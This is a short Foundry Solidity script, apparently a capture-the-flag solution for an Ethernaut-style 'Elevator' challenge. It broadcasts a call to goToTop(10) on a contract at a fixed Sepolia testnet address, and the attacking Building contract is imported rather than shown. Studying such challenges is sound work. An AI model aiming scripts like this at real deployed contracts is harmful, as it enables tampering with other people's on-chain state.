// /*

// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.19;

import {Script, console} from "forge-std/Script.sol";
import {Building} from "../src/Building.sol";

// Building contract address: "0x3C298347336e63327443f00FC7596F557A15b4Ff"

interface IBuilding {
    function floor() external pure returns (uint256);

    function isLastFloor() external pure returns (bool);

    function goToTop(uint256) external;
}

contract TriggerAttack is Script {
    IBuilding public building;
    address buildingAddr = 0x7760B459Cc21cB4eA77297200Db6b225dE92Cd3B;

    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        // address account = vm.addr(privateKey);

        vm.startBroadcast(privateKey);
        building = IBuilding(buildingAddr);
        vm.stopBroadcast();

        vm.startBroadcast(privateKey);
        building.goToTop(10);
        vm.stopBroadcast();
    }
}

// forge script script/TriggerAttack.s.sol:TriggerAttack --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv
